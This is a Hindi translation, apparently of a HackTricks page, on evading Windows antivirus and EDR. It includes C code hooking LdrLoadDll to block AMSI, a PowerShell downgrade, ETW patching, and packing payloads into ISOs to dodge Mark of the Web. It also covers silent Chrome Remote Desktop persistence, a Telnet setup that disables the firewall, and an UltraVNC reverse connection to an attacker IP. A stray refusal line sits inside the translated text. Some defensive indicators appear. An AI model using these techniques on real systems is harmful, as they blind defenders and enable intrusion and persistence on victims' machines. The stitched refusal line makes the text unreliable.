AMSI तभी initialize होता है, जब मौजूदा process में `amsi.dll` लोड हो जाए। एक मज़बूत, language-agnostic bypass यह है कि `ntdll!LdrLoadDll` पर user-mode hook लगाया जाए, जो अनुरोधित module `amsi.dll` होने पर error लौटाए। परिणामस्वरूप, उस process में AMSI कभी लोड नहीं होता और कोई scan नहीं होता।<sup>[[23]](#references)</sup>

Implementation की रूपरेखा (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
मैं antivirus/EDR को bypass करने या detection से बचने के निर्देशों का अनुवाद नहीं कर सकता। मैं इस सामग्री को रक्षात्मक विश्लेषण या detection guidance के रूप में अनुवाद करने में मदद कर सकता हूँ।

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging एक ऐसी सुविधा है जो system पर चलाए गए सभी PowerShell commands को log करती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन **पता लगाने से बचना चाहने वाले attackers के लिए समस्या भी बन सकती है**।

PowerShell logging को bypass करने के लिए, आप ये techniques इस्तेमाल कर सकते हैं:

- **PowerShell Transcription और Module Logging को Disable करें**: इस काम के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का इस्तेमाल कर सकते हैं।
- **Powershell version 2 का इस्तेमाल करें**: अगर आप PowerShell version 2 का इस्तेमाल करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। ऐसा करने के लिए: `powershell.exe -version 2`
- **Unmanaged PowerShell session का इस्तेमाल करें**: `powershell.exe` लॉन्च किए बिना PowerShell host करने के लिए [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का इस्तेमाल करें (यह Cobalt Strike के `powerpick` में इस्तेमाल किया गया तरीका है)। इससे खास तौर पर `powershell.exe` process से जुड़े controls से बचा जा सकता है, लेकिन यह अपने-आप AMSI, Script Block Logging या हर दूसरे PowerShell defense को disable नहीं करता; protection runtime और host implementation पर निर्भर करती है।


## Obfuscation

> [!TIP]
> कई obfuscation techniques में data को encrypt किया जाता है, जिससे binary की entropy बढ़ती है और AVs तथा EDRs के लिए उसे detect करना आसान हो जाता है। इस बारे में सावधान रहें और शायद encryption केवल अपने code के उन खास sections पर लागू करें जो sensitive हैं या जिन्हें छिपाना ज़रूरी है।

### ConfuserEx-Protected .NET Binaries को Deobfuscate करना

ConfuserEx 2 (या commercial forks) का इस्तेमाल करने वाले malware का analysis करते समय, अक्सर protection की कई layers का सामना करना पड़ता है, जो decompilers और sandboxes को रोक देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से **लगभग original IL को restore करता है**, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।<sup>[[10]](#references)</sup>

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* के static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है, इसलिए किसी भी modification से binary crash हो जाएगी। Encrypted metadata tables ढूँढ़ने, XOR keys recover करने और साफ assembly फिर से लिखने के लिए **AntiTamperKiller** का इस्तेमाल करें:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को दें।
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profile चुनें
     • de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names को restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और कठिन बनाने के लिए direct method calls को lightweight wrappers (जिन्हें *proxy calls* भी कहते हैं) से बदल देता है। इन्हें **ProxyCall-Remover** से हटाएँ:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   इस चरण के बाद आपको `Convert.FromBase64String` या `AES.Create()` जैसे सामान्य .NET API दिखाई देने चाहिए, न कि अपारदर्शी wrapper functions (`Class8.smethod_10`, …)।

4.  मैन्युअल सफ़ाई – परिणामी binary को dnSpy में चलाएँ और बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग को खोजकर *असली* payload का पता लगाएँ। अक्सर malware इसे `<Module>.byte_0` के अंदर initialized TLV-encoded byte array के रूप में संग्रहीत करता है।

ऊपर दी गई chain, malicious sample चलाने की ज़रूरत के बिना, execution flow को पुनर्स्थापित करती है — offline workstation पर काम करते समय यह उपयोगी है।

> 🛈  ConfuserEx एक custom attribute `ConfusedByAttribute` बनाता है, जिसे samples की स्वचालित triage के लिए IOC के रूप में इस्तेमाल किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस project का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक open-source fork प्रदान करना है, जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के ज़रिए software security बढ़ा सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि किसी external tool का उपयोग किए बिना और compiler में बदलाव किए बिना, compile time पर obfuscated code बनाने के लिए `C++11/14` language का उपयोग कैसे किया जा सकता है।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework से तैयार obfuscated operations की एक layer जोड़ें, जिससे application को crack करने की कोशिश करने वाले व्यक्ति का काम थोड़ा कठिन हो जाएगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है, जो अलग-अलग PE files को obfuscate कर सकता है, जिनमें .exe, .dll, .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame मनमाने executables के लिए एक सरल metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) का उपयोग करने वाली LLVM-supported languages के लिए एक fine-grained code obfuscation framework है। ROPfuscator, regular instructions को ROP chains में बदलकर assembly code level पर program को obfuscate करता है, जिससे normal control flow की हमारी सहज समझ बाधित होती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim में लिखा गया .NET PE Crypter है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में बदलकर फिर load कर सकता है।

### LLVM compiler की सहायता से प्रति-function self-masking

किसी implant को केवल उसके सोते समय पूरी तरह mask करने के बजाय, संशोधित LLVM X86 backend चुने हुए functions को निष्क्रिय रहने पर XOR-mask करके रख सकता है। Function Peekaboo PoC, demangled names में `REG_` वाले नाम चुनता है, अंतिम machine code के आसपास position-independent entry/exit stubs जोड़ता है, और `.text` में एक shared masking handler emit करता है; source-level signatures और Windows x64 calling convention अपरिवर्तित रहते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend का control-flow transformation

यह instruction selection और optimization के बाद होना चाहिए, क्योंकि transformation को **हर emitted return** को शामिल करना और सटीक x86 layout जानना आवश्यक है। एक pre-emission `MachineFunctionPass`, अंतिम `MachineInstr::isReturn()` ढूँढ़ता है और उसे हटा देता है, ताकि अंतिम path appended epilogue में आगे बढ़े; पहले के returns को `JMP_1 handler` से बदल देता है। हर return से पहले मौजूद compiler-generated stack/frame teardown को बनाए रखें; केवल return instruction को redirect करें।<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` और `emitFunctionBodyEnd()` प्रति-function stubs emit करते हैं, जबकि `emitEndOfAsmFile()` handler emit करता है। Emission stages के बीच साझा symbols, prologue branch को उसके बाद आने वाले epilogue तक पहुँचने देते हैं; manually emitted near `je` के लिए, `0F 84` लिखें, जिसके बाद चार-byte MC expression `target - address_after_je` हो। Handler तक जाने वाले calls और jumps को इसके बजाय `MCInst` objects (`CALL64pcrel32` और `JMP_1`) के रूप में emit किया जा सकता है। जब किसी unselected function में कोई बदलाव न हुआ हो, तो pass को `false` लौटाना चाहिए; PoC उस path पर गलती से `true` लौटाता है।<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata और pre-CRT initialization

PoC, `.funcmeta` में एक XOR key और 16-byte records रखता है, जिनमें loader-relocated function pointer और runtime length होते हैं। C field `uint32_t` होने के बावजूद, handler record offset `+8` पर QWORD access करता है, जिससे length और उसकी padding दोनों पढ़ी जाती हैं, और records को `0x10` के अंतर से आगे बढ़ाता है। PE section names केवल आठ bytes के होते हैं, इसलिए runtime lookup को `.funcmet` दिखता है। एक external patcher, executable `.stub` जोड़ता है, stub में पुराना entry-point RVA सुरक्षित रखता है और `AddressOfEntryPoint` को redirect करता है; PIC stub, `gs:[0x60]` → `[PEB+0x10]` से image base प्राप्त करता है, पहले से imported `VirtualProtect` को resolve करने के लिए PE32+ imports को traverse करता है, और CRT से पहले चलता है।<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` में sentinel सेट करता है और हर metadata function को call करता है। इसका हमेशा readable रहने वाला prologue, function start को `gs:[0xF0]` में दर्ज करता है, sentinel का पता लगाता है और अभी-clear body को छोड़ देता है। इसके बाद epilogue `call handler` का उपयोग करता है; handler द्वारा 13 registers (`0x68` bytes) save करने के बाद, `[rsp+0x68]` पर return address transformed function का end होता है, इसलिए `end - start` को उसके metadata record में लिखा जा सकता है। सभी bodies mask हो जाने के बाद stub, sentinel clear करता है और `ImageBase + original_entry_point_RVA` पर jump करता है।<sup>[[38]](#references)[[39]](#references)</sup>

सामान्य call के दौरान, prologue body को decode करने के लिए उसी symmetric handler को call करता है। अंतिम path appended epilogue में आगे बढ़ता है, जबकि हर पहले वाला return सीधे shared handler पर jump करता है। सामान्य epilogue भी `call` के बजाय `jmp handler` का उपयोग करता है, ताकि remasking के बाद handler का `ret`, original caller का return address consume करे और function result `RAX` में सुरक्षित रहे।<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive और analysis indicators

Handler, मौजूदा record ढूँढ़ता है, निश्चित visible prologue (`इस build में `0x46` bytes) को छोड़ता है, बाकी हिस्से को `PAGE_EXECUTE_READWRITE` में बदलता है, उसे byte-by-byte low key byte से XOR करता है, और फिर `PAGE_EXECUTE_READ` पर सेट करता है। इसलिए यही loop entry पर decode और हर सामान्य exit पर encode करता है।<sup>[[38]](#references)[[39]](#references)</sup>

इस design के high-signal indicators में शामिल हैं:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` के भीतर entry point और key तथा relocated `.text` pointers रखने वाला `.funcmet` section;
- pre-CRT PEB, import-table और section-table parsing, जिसके बाद हर metadata pointer के ज़रिए calls;
- समान `call`/`pop` PIC prologues और कई return sites का एक handler पर redirect होना;
- `gs:[0xE8]`, `gs:[0xF0]` और `gs:[0xF8]` में writes, जिनके बाद बार-बार `VirtualProtect` transitions और image-backed executable pages में bytewise XOR writes होते हैं।

यह memory-scanner evasion है, cryptographic protection नहीं: patched file में original clear body अब भी मौजूद रहती है, और debugger में `VirtualProtect` या XOR loop पर break करके active function dump किया जा सकता है। Single-byte XOR, readable metadata और निश्चित `0x46` boundary भी offline recovery को आसान बनाते हैं।<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC के TEB slots thread-local हैं, लेकिन modified code pages process-wide हैं। इसलिए concurrent या recursive entry, किसी अन्य invocation के चलने के दौरान instructions को दोबारा toggle कर सकती है; exceptions और nonlocal exits भी remasking को bypass कर सकते हैं। एक robust implementation को transitions synchronize करने चाहिए, `lpflOldProtect` के ज़रिए लौटाई गई वास्तविक protection restore करनी चाहिए, hard-coded stub lengths से बचना चाहिए, x64 stack alignment के लिए `call` और `jmp` दोनों paths का audit करना चाहिए, और executable bytes rewrite करने के बाद `FlushInstructionCache` call करना चाहिए। Microsoft स्पष्ट रूप से executable code में बदलाव होने पर instruction-cache coherency की ज़िम्मेदारी caller पर डालता है।<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

आपने इंटरनेट से कुछ executables download करके उन्हें चलाते समय यह screen देखी होगी।

Microsoft Defender SmartScreen एक security mechanism है, जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से reputation-based approach पर काम करता है; यानी, जिन applications को आमतौर पर download नहीं किया जाता, वे SmartScreen को trigger करेंगी, जिससे end user को चेतावनी मिलेगी और file चलाने से रोका जाएगा (हालाँकि More Info -> Run anyway पर click करके file फिर भी चलाई जा सकती है)।

**MoTW** (Mark of The Web), Zone.Identifier नाम का एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है, जो इंटरनेट से files download होने पर अपने आप बनाया जाता है और इसमें उस URL की जानकारी भी होती है जहाँ से file download की गई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से download की गई file के लिए Zone.Identifier ADS की जाँच करना।</p></figcaption></figure>

> [!TIP]
> ध्यान दें कि **trusted** signing certificate से signed executables **SmartScreen को trigger नहीं करेंगे**।

अपने payloads को Mark of The Web से बचाने का एक बेहद प्रभावी तरीका है उन्हें ISO जैसे किसी container में package करना। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW), **non NTFS** volumes पर लागू **नहीं** किया जा सकता।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक tool है, जो Mark-of-the-Web से बचने के लिए payloads को output containers में package करता है।

उदाहरण के लिए उपयोग:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

यह PackMyPayload का उपयोग करके payloads को ISO files के अंदर पैकेज करके SmartScreen bypass करने का डेमो है: [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows में एक शक्तिशाली logging mechanism है, जो applications और system components को **events log** करने की अनुमति देता है। हालाँकि, इसका उपयोग security products द्वारा malicious activities को monitor और detect करने के लिए भी किया जा सकता है।

AMSI को disable (bypass) करने की तरह, user space process के **`EtwEventWrite`** function को भी बिना कोई event log किए तुरंत return कराया जा सकता है। ऐसा memory में function को patch करके उसे तुरंत return कराने से होता है, जिससे उस process के लिए ETW logging प्रभावी रूप से disable हो जाती है।

आपको अधिक जानकारी **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) और [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** में मिल सकती है।<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binaries को memory में load करने की तकनीक लंबे समय से जानी जाती है और AV की पकड़ में आए बिना अपने post-exploitation tools चलाने का यह अब भी एक बहुत अच्छा तरीका है।

चूँकि payload सीधे memory में load होगा और disk को छुएगा नहीं, इसलिए हमें केवल पूरे process के लिए AMSI patch करने की चिंता करनी होगी।

अधिकांश C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही C# assemblies को सीधे memory में execute करने की सुविधा देते हैं, लेकिन ऐसा करने के अलग-अलग तरीके हैं:

- **Fork\&Run**

इसमें **एक नया sacrificial process शुरू करना**, अपने post-exploitation malicious code को उस नए process में inject करना, अपना malicious code execute करना और काम पूरा होने पर नए process को kill करना शामिल है। इसके फायदे और नुकसान दोनों हैं। Fork and run method का फायदा यह है कि execution हमारे Beacon implant process के **बाहर** होता है। इसका मतलब है कि अगर post-exploitation कार्रवाई के दौरान कुछ गलत होता है या पकड़ में आ जाता है, तो हमारे **implant के बचने की संभावना** काफी **ज़्यादा** होती है। इसका नुकसान यह है कि **Behavioural Detections** द्वारा पकड़े जाने की **संभावना ज़्यादा** होती है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

इसमें post-exploitation malicious code को **अपने ही process में** inject किया जाता है। इस तरह, आप नया process बनाने और उसे AV द्वारा scan करवाने से बच सकते हैं। लेकिन इसका नुकसान यह है कि payload के execution में कुछ गड़बड़ होने पर **अपना beacon खोने की संभावना** काफी **ज़्यादा** होती है, क्योंकि वह crash हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> अगर आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो यह article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) देखें।

आप C# Assemblies को **PowerShell से भी** load कर सकते हैं। [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t का video](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## .NET tools की NativeAOT WebAssembly repackaging (WasmForge)

सामान्य `execute-assembly` techniques में पहचानने योग्य MSIL मौजूद रहता है और अंततः CLR initialize होता है। **WasmForge** इसके बजाय execution substrate को बदलता है: यह C# project को experimental NativeAOT-LLVM WASI target पर migrate करता है, उसे WebAssembly में ahead of time compile करता है और उस module को Wazero-आधारित Windows PE host में embed करता है। परिणामी process को target के CLR, JIT या `dotnet` host की ज़रूरत नहीं होती, इसलिए केवल managed assembly names, CLR loading, AMSI या .NET ETW पर आधारित rules की सीधी visibility नहीं रहती। यह evasion/packaging technique है, privilege boundary bypass नहीं—guest को मूल tool की permissions और OS पर दिखने वाला व्यवहार मिलता है।<sup>[[44]](#references)[[45]](#references)</sup>

### C# project बनाना

अनुशंसित build path project का Docker environment है, क्योंकि इसमें .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker और signing dependencies शामिल हैं। `.csproj` का अपने-आप पता लगाया जाता है; one-shot build में migration, compatibility patching, WASM compilation, PE forging और signing होते हैं।<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

समस्या-निवारण या जनरेट किए गए code की समीक्षा के लिए, प्रक्रिया को `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, और अंत में `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` में बाँटें। Build image, WASI Preview 2 component encoding से बचने और embedded runtime के अपेक्षित plain module को बनाने के लिए `wasm-component-ld` wrapper का भी उपयोग करती है।<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# को x64 Win32 से जोड़ना

यह पारदर्शी recompile नहीं है। NativeAOT-WASI में Windows-उन्मुख BCL सुविधाएँ अनुपलब्ध हैं या अलग तरह से काम करती हैं, और wasm32 guest आम तौर पर चार-byte pointer slots allocate करता है, जबकि x64 APIs आठ-byte pointers लौटा सकती हैं। WasmForge इन दोनों समस्याओं को निम्न generated layers से हल करता है:<sup>[[44]](#references)</sup>

1. एक source patcher, AOT-विशिष्ट semantic अंतर ठीक करता है और unsupported registry, pipes, WMI, identity, directory-service, file-version, LSA तथा ऐसी ही calls को `Wf*` helpers की ओर redirect करता है।
2. एक P/Invoke scanner, NativeAOT `DirectPInvoke` mappings बनाता है, ताकि `[DllImport]` calls guest के भीतर घोषित DLL को dynamically load करने के बजाय linked C bridge symbols से bind हों।
3. Host-bound pointers के लिए C# में `ulong` और C में `uint64_t` का उपयोग होता है। एक generic dispatcher, call को host के Win32 handler तक पहुँचाता है; `out8_mask` उन वास्तविक आठ-byte output slots को चिह्नित करता है जिनके upper halves सुरक्षित रखने होते हैं। बिना चिह्न वाले wasm32-आकार के outputs के लिए snapshot/restore protection का उपयोग होता है, ताकि x64 write पास के चार bytes को corrupt न कर सके।
4. Dedicated host bridges उन operations को संभालते हैं जो generic syscall dispatch में फिट नहीं होते, जैसे LSA ticket-cache access, structured results वाले Kerberos/BCrypt operations, TCP KDC traffic और LDAP queries।

उदाहरण के लिए, `version.dll!VerQueryValueW` के लिए एक wrapper चार host addresses पास करता है और bits 2 और 3 (`0xC`) सेट करता है, क्योंकि value pointer और length आठ-byte output slots हैं। Wrapper स्वयं generic रहता है और DLL name, export name, arguments तथा mask को `wf_call_v2` तक पहुँचाता है; host pointer translation करता है और native API invoke करता है।<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### सीमाएँ और detection pivots

Reflection-heavy code, dynamic assembly loading, arbitrary native callbacks, और WASM memory में लौटाए जाने वाले complex x64 structures के लिए अब भी per-tool patches की ज़रूरत पड़ सकती है या वे पूरी तरह विफल हो सकते हैं। Generic WASI Preview 2 sockets भी no-op stubs तक पहुँच सकते हैं, इसलिए समर्थित tools protocol-specific host shims का उपयोग करते हैं। Feature parity मान लेने के बजाय हर command को native build के विरुद्ध validate करें।<sup>[[44]](#references)[[45]](#references)</sup>

यह technique payload को अदृश्य बनाने के बजाय telemetry को बदलती है। Detection का ध्यान ऐसे PE पर जा सकता है जिसमें WASM module मौजूद हो या materialize किया जा रहा हो, Wazero-जैसा runtime behavior, असामान्य host/guest memory allocation और copying, generic direct Win32 dispatch, signing और PE-resource anomalies, साथ ही उससे होने वाली API calls और network traffic पर। इसलिए CLR-load, AMSI, या .NET ETW events का न होना इस बात का सबूत नहीं मानना चाहिए कि process benign है।<sup>[[44]](#references)</sup>

## अन्य Programming Languages का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित तरीके के अनुसार, compromised machine को **Attacker Controlled SMB share पर installed interpreter environment तक access देकर** अन्य languages का उपयोग करके malicious code execute करना संभव है।

SMB share पर Interpreter Binaries और environment तक access देकर आप compromised machine की **memory में इन languages के arbitrary code को execute** कर सकते हैं।

Repo के अनुसार: Defender अब भी scripts scan करता है, लेकिन Go, Java, PHP आदि का उपयोग करके हमें **static signatures को bypass करने के लिए अधिक flexibility** मिलती है। इन languages में random, unobfuscated reverse shell scripts के साथ testing सफल रही है।

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR या AV जैसे security product के access token में बदलाव करता है। Token के privileges कम करने से process चलता रह सकता है, जबकि उसे privileged inspection या remediation actions करने से रोका जा सकता है।

इसे रोकने के लिए Windows **external processes को** security processes के tokens के handles लेने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Software का उपयोग

### Chrome Remote Desktop

[**इस blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) में बताए अनुसार, victim के PC में Chrome Remote Desktop deploy करना और फिर उसका उपयोग करके उस पर नियंत्रण पाना और persistence बनाए रखना आसान है:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ से download करें, "Set up via SSH" पर click करें, फिर Windows के लिए MSI file download करने हेतु MSI file पर click करें।
2. Victim पर installer को silently run करें (admin आवश्यक है): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop page पर वापस जाएँ और next पर click करें। Wizard आपसे authorize करने को कहेगा; आगे बढ़ने के लिए Authorize button पर click करें।
4. ज़रूरी बदलावों के साथ दिया गया command execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parameter GUI का उपयोग किए बिना PIN set करता है)।
 

## Advanced Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion एक बहुत जटिल विषय है। कभी-कभी आपको एक ही system में telemetry के कई अलग-अलग स्रोतों पर ध्यान देना पड़ता है, इसलिए mature environments में पूरी तरह undetected रहना लगभग असंभव है।

आप जिस भी environment का सामना करेंगे, उसकी अपनी खूबियाँ और कमज़ोरियाँ होंगी।

मैं आपको [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखने की पुरज़ोर सलाह देता हूँ, ताकि आपको और Advanced Evasion techniques की बुनियादी समझ मिल सके।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Evasion in Depth के बारे में [@mariuszbit](https://twitter.com/mariuszbit) की यह भी एक बेहतरीन talk है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **पुरानी Techniques**

### **जाँचें कि Defender किन हिस्सों को malicious मानता है**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं, जो **binary के हिस्सों को हटाता रहता है** जब तक उसे **यह पता नहीं चल जाता कि Defender किस हिस्से को** malicious मान रहा है, फिर उस हिस्से को आपके लिए अलग कर देता है।\
**यही काम करने वाला** एक अन्य tool [**avred**](https://github.com/dobin/avred) है, जो यह service खुले web पर [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) में उपलब्ध कराता है।

### **Telnet Server**

Windows10 तक, सभी Windows में एक **Telnet server** आता था, जिसे आप (administrator के रूप में) इस तरह install कर सकते थे:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

इसे सिस्टम शुरू होने पर **शुरू** करें और इसे अभी **चलाएँ**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet port बदलें (stealth) और firewall disable करें:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin downloads चाहिए, setup नहीं)

**HOST पर**: _**winvnc.exe**_ चलाएँ और server configure करें:

- _Disable TrayIcon_ विकल्प enable करें
- _VNC Password_ में password सेट करें
- _View-Only Password_ में password सेट करें

फिर, binary _**winvnc.exe**_ और **नया** बनाया गया file _**UltraVNC.ini**_ **victim** के अंदर ले जाएँ

#### **Reverse connection**

**attacker** को अपने **host** पर binary `vncviewer.exe -listen 5900` **चलानी चाहिए**, ताकि वह reverse **VNC connection** पाने के लिए **तैयार** हो। फिर, **victim** के अंदर: winvnc daemon `winvnc.exe -run` शुरू करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` चलाएँ

**चेतावनी:** stealth बनाए रखने के लिए कुछ काम न करें

- अगर `winvnc` पहले से चल रहा है, तो उसे शुरू न करें, वरना एक [popup](https://i.imgur.com/1SROTTl.png) trigger होगा। `tasklist | findstr winvnc` से जाँचें कि यह चल रहा है या नहीं
- `winvnc` को उसी directory में `UltraVNC.ini` के बिना शुरू न करें, वरना [config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
